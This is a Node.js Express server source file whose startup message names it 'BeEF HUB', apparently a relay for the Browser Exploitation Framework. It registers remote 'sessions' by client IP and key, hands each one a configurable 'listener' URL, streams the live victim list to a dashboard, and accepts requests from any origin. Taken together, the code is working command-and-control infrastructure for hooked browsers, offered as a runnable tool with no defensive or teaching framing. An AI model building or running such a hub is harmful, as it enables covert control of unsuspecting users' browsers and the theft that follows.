const express = require("express");
const fs      = require("fs");
const path    = require("path");
const cors    = require("cors");

const app          = express();
const PORT         = process.env.PORT || 3000;
const ROUTE_JSON   = path.join(__dirname, "api", "route.json");
const SESSION_JSON = path.join(__dirname, "api", "sessions.json");

function ensureJson(filePath, defaultValue) {
  if (!fs.existsSync(filePath)) {
    fs.mkdirSync(path.dirname(filePath), { recursive: true });
    fs.writeFileSync(filePath, JSON.stringify(defaultValue, null, 2));
  }
}

ensureJson(ROUTE_JSON,   { listener: null });
ensureJson(SESSION_JSON, []);

const corsOptions = {
  origin: "*",
  methods: ["GET", "POST", "OPTIONS"],
  allowedHeaders: ["Content-Type"]
};

app.use(cors(corsOptions));
app.options("*", cors(corsOptions));
app.use(express.json());
app.use(express.static(path.join(__dirname, "public")));

const sseClients = new Set();

fs.watch(SESSION_JSON, { persistent: true }, (eventType) => {
  if (eventType !== "change") return;
  clearTimeout(fs.watch._debounce);
  fs.watch._debounce = setTimeout(() => {
    try {
      const raw  = fs.readFileSync(SESSION_JSON, "utf8");
      const data = JSON.parse(raw);
      broadcast(data);
    } catch (_) {}
  }, 80);
});

function broadcast(data) {
  const payload = `event: sessions\ndata: ${JSON.stringify(data)}\n\n`;
  sseClients.forEach(res => {
    try { res.write(payload); } catch (_) { sseClients.delete(res); }
  });
}

app.get("/api/sessions/stream", (req, res) => {
  res.setHeader("Content-Type",  "text/event-stream");
  res.setHeader("Cache-Control", "no-cache");
  res.setHeader("Connection",    "keep-alive");
  res.setHeader("X-Accel-Buffering", "no");
  res.flushHeaders();

  try {
    const raw  = fs.readFileSync(SESSION_JSON, "utf8");
    const data = JSON.parse(raw);
    res.write(`event: sessions\ndata: ${JSON.stringify(data)}\n\n`);
  } catch (_) {
    res.write(`event: sessions\ndata: []\n\n`);
  }

  const heartbeat = setInterval(() => {
    try { res.write(": heartbeat\n\n"); } catch (_) { clearInterval(heartbeat); }
  }, 25000);

  sseClients.add(res);

  req.on("close", () => {
    sseClients.delete(res);
    clearInterval(heartbeat);
  });
});

app.get("/api/sessions.json", (req, res) => {
  try {
    res.json(JSON.parse(fs.readFileSync(SESSION_JSON, "utf8")));
  } catch (_) {
    res.json([]);
  }
});

app.post("/api/sessions", (req, res) => {
  const incoming = req.body;

  const entry = Array.isArray(incoming) ? incoming[0] : incoming;

  if (!entry || typeof entry !== "object" || !entry.Client) {
    return res.status(400).json({ error: "Expected an object with at least a Client field" });
  }

  try {
    let sessions = [];
    try {
      sessions = JSON.parse(fs.readFileSync(SESSION_JSON, "utf8"));
    } catch (_) {}

    const ip     = entry.Client;
    const isDead = String(entry.Status || "").toLowerCase() === "dead";
    const idx    = sessions.findIndex(s => s.Client === ip);

    if (isDead) {
      if (idx !== -1) sessions.splice(idx, 1);
    } else if (idx !== -1) {
      sessions[idx] = {...sessions[idx], ...entry, lastSeen: Date.now()};
    } else {
      sessions.push({...entry, lastSeen: Date.now()});
    }

    fs.writeFileSync(SESSION_JSON, JSON.stringify(sessions, null, 2));

    res.json({
      ok: true,
      action: isDead ? "deleted" : idx !== -1 ? "updated" : "inserted",
      count: sessions.length
    });
  } catch (err) {
    console.error("Session upsert error:", err);
    res.status(500).json({ error: "Could not write sessions.json" });
  }
});

app.get("/", (req, res) => {
  let listener = null;
  try {
    listener = JSON.parse(fs.readFileSync(ROUTE_JSON, "utf8")).listener ?? null;
  } catch (_) {}

  let html = fs.readFileSync(path.join(__dirname, "public", "index.html"), "utf8");
  html = html.replace("__SSR_LISTENER__", listener ? JSON.stringify(listener) : "null");
  res.setHeader("Content-Type", "text/html");
  res.send(html);
});

app.get("/sessions", (req, res) => {
  res.sendFile(path.join(__dirname, "public", "sessions.html"));
});

app.get("/api/route.json", (req, res) => {
  try {
    res.json(JSON.parse(fs.readFileSync(ROUTE_JSON, "utf8")));
  } catch (_) {
    res.json({ listener: null });
  }
});

app.post("/api/route", (req, res) => {
  const { FROM, KEY, STATUS } = req.body;

  const Client =
    (req.headers["x-forwarded-for"] || "")
      .split(",")[0]
      .trim() ||
    req.socket.remoteAddress ||
    req.body.Client;

  if (!Client) {
    return res
      .status(400)
      .json({ error: "Could not resolve Client IP" });
  }

  try {
    let routeData = { listener: null };

    try {
      routeData = JSON.parse(
        fs.readFileSync(ROUTE_JSON, "utf8")
      );
    } catch (_) {}

    let sessions = [];

    try {
      sessions = JSON.parse(
        fs.readFileSync(SESSION_JSON, "utf8")
      );
    } catch (_) {}

    const idx = sessions.findIndex(
      s => s.Client === Client
    );

    const isDead =
      String(STATUS || "").toLowerCase() === "dead";

    if (isDead) {
      if (idx !== -1) {
        sessions.splice(idx, 1);
      }
    } else {
      const session = {
        FROM,
        Client,
        KEY,
        STATUS: STATUS || "active",
        lastSeen: Date.now()
      };

      if (idx !== -1) {
        sessions[idx] = session;
      } else {
        sessions.push(session);
      }
    }

    fs.writeFileSync(
      SESSION_JSON,
      JSON.stringify(sessions, null, 2)
    );

    res.json(routeData);
  } catch (err) {
    console.error(err);

    res.status(500).json(routeData);
  }
});

app.post("/api/set-listener", (req, res) => {
  const { hashedUrl } = req.body;
  if (!hashedUrl || typeof hashedUrl !== "string")
    return res.status(400).json({ error: "hashedUrl is required" });

  try {
    let data = {};
    try { data = JSON.parse(fs.readFileSync(ROUTE_JSON, "utf8")); } catch (_) {}
    data.listener = hashedUrl;
    fs.writeFileSync(ROUTE_JSON, JSON.stringify(data, null, 2));
    res.json({ ok: true, listener: hashedUrl });
  } catch (err) {
    res.status(500).json({ error: "Could not write route.json" });
  }
});

app.listen(PORT, () => {
  console.log(`BeEF HUB → http://localhost:${PORT}`);
  console.log(`Sessions  → http://localhost:${PORT}/sessions`);
});

setInterval(() => {
  try {
    let sessions = [];

    try {
      sessions = JSON.parse(
        fs.readFileSync(SESSION_JSON, "utf8")
      );
    } catch (_) {
      return;
    }

    const now = Date.now();

    const activeSessions = sessions.filter(
      session => now - (session.lastSeen || 0) < 60000
    );

    if (activeSessions.length !== sessions.length) {
      fs.writeFileSync(
        SESSION_JSON,
        JSON.stringify(activeSessions, null, 2)
      );
    }
  } catch (err) {
    console.error("Session cleanup error:", err);
  }
}, 10000);